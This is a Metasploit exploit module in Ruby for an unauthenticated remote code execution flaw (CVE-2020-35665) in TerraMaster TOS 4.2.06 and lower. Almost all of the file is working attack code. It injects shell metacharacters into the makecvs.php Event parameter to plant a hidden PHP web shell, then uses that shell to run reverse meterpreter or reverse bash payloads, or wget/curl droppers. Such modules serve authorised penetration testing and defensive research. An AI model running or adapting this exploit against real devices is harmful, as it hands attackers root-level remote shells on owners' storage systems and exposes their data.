##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TerraMaster TOS 4.2.06 or lower - Unauthenticated Remote Code Execution',
        'Description' => %q{
          This module exploits an unauthenticated remote code-execution vulnerability in TerraMaster TOS 4.2.06
          and lower via shell metacharacters in the Event parameter at vulnerable endpoint `include/makecvs.php`
          during CSV creation.
          Any unauthenticated user can therefore execute commands on the system under the same privileges as the
          web application, which typically runs under root at the TerraMaster Operating System.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'IHTeam' # Discovery
        ],
        'References' => [
          ['CVE', '2020-35665'],
          ['CVE', '2020-28188'],
          ['PACKETSTORM', '160685'],
          ['PACKETSTORM', '160687'],
          ['URL', 'https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/'],
          ['URL', 'https://attackerkb.com/topics/lXY4yjOvwx/cve-2020-35665']
        ],
        'DisclosureDate' => '2020-12-12',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_PHP, ARCH_X64, ARCH_X86, ARCH_AARCH64],
        'Privileged' => false,
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP,
              'Type' => :php,
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['printf', 'echo', 'bourne', 'wget', 'curl'],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8181,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Path to Terramaster Web console', '/']),
      OptString.new('WEBSHELL', [false, 'Web shell name with extension .php. Name will be randomly generated if left unset.', nil]),
      OptEnum.new('COMMAND',
                  [true, 'Use PHP command function', 'passthru', %w[passthru shell_exec system exec]], conditions: %w[TARGET != 0])
    ])
  end

  def upload_webshell
    # randomize file name if option WEBSHELL is not set
    @webshell_name = (datastore['WEBSHELL'].blank? ? "#{Rex::Text.rand_text_alpha(8..16)}.php" : datastore['WEBSHELL'].to_s)

    @post_param = Rex::Text.rand_text_alphanumeric(1..8)
    @get_param = Rex::Text.rand_text_alphanumeric(1..8)

    # Upload PHP payload
    webshell = if target['Type'] == :php
                 "http|echo \"<?php @eval(base64_decode(\\$_POST[\'#{@post_param}\']));?>\" > #{@webshell_name}||"
               else
                 "http|echo \"<?=\\$_GET[\'#{@get_param}\'](base64_decode(\\$_POST[\'#{@post_param}\']));?>\" > #{@webshell_name}||"
               end

    return send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'include', 'makecvs.php'),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_get' => {
        'Event' => webshell.to_s
      }
    })
  end

  def get_terramaster_info
    # get Terramaster CPU architecture (X64 or ARM64) and TOS version
    @terramaster = {}
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'tos', 'index.php?user/login')
    })

    if res && res.body && res.code == 200
      # get the version information from the request response like below:
      # <link href="./static/style/bootstrap.css?ver=TOS3_A1.0_4.2.07" rel="stylesheet"/>
      return if res.body.match(/ver=.+?"/).nil?

      version = res.body.match(/ver=.+?"/)[0]
      # check if architecture is ARM64 or X64
      if version.match(/_A/)
        @terramaster['cpu_arch'] = 'ARM64'
      elsif version.match(/_S/) || version.match(/_Q/)
        @terramaster['cpu_arch'] = 'X64'
      else
        @terramaster['cpu_arch'] = 'UNKNOWN'
      end

      # strip TOS version number and remove trailing double quote.
      @terramaster['tos_version'] = version.split('.0_')[1].chop
    end
  end

  def execute_php(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'include', @webshell_name),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        @post_param => payload
      }
    })
  end

  def execute_command(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    php_cmd_function = datastore['COMMAND']
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'include', @webshell_name),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_get' => {
        @get_param => php_cmd_function
      },
      'vars_post' => {
        @post_param => payload
      }
    })
  end

  def check
    get_terramaster_info
    return CheckCode::Safe if @terramaster.empty?

    if Rex::Version.new(@terramaster['tos_version']) <= Rex::Version.new('4.2.06')
      return CheckCode::Vulnerable("TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.")
    else
      return CheckCode::Safe("TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.")
    end
  end

  def exploit
    res = upload_webshell
    fail_with(Failure::UnexpectedReply, 'Web shell upload error.') if res.nil? || (res.code != 200)
    register_file_for_cleanup(@webshell_name.to_s)

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :php
      execute_php(payload.encoded)
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager(linemax: 65536)
    end
  end
end
